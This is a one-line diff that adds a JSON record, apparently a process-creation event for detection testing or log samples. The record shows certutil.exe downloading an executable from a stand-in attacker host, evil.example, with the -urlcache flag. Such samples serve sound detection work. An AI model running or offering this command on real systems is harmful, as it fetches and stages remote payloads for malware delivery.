@@ -1,0 +1,1 @@
+{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -f http://evil.example/a.exe a.exe"}
